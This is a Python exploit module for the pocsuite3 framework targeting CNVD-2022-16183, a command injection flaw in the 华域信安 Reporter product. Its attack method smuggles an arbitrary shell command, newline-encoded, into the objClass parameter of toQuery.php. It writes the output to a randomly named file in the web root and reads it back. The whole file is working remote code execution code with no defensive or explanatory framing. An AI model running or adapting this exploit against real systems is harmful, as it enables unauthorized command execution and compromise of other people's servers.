from pocsuite3.api import register_poc, POCBase, logger, requests
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString
import random
import string
from urllib.parse import urljoin


class EXP(POCBase):
    cnvd = "CNVD-2022-16183"
    name = "华域信安Reporter命令注入"
    vulDate = "2022-03-03"
    appName = "华域信安"
    vulType = "Remote Code Execute"
    OPTIONS = OrderedDict({"command": OptString('id', "自定义执行指令")})

    def _attack(self):
        ranstr = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        command = self.get_option('command')
        s = requests.session()
        cmd = "{0}%20>/var/www/reporter/view/Behavior/{1}.txt".format(command, ranstr)
        target_path = "/view/Behavior/toQuery.php?method=getList&objClass=%0a" + cmd + "%0a"
        info_url = urljoin(self.url, f'/view/Behavior/{ranstr}.txt')
        exec_cmd = urljoin(self.url, target_path)
        s.get(exec_cmd, verify=False, timeout=5)
        get_info = s.get(info_url, verify=False, timeout=5)
        if 'uid' in get_info.text:
            return self.parse_output({'VerifyInfo': {command: get_info.text}})
        else:
            logger.warning("Target is not Vuln")


register_poc(EXP)

if __name__ == "__main__":
    import os

    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    os.environ.setdefault('http', 'http://127.0.0.1:7890')
    exp = EXP()
    logger.setLevel(level='DEBUG')
    exp.set_option('url', 'https://127.0.0.1:9091')
    exp.set_option('command', 'id')
    exp.execute(mode='attack')
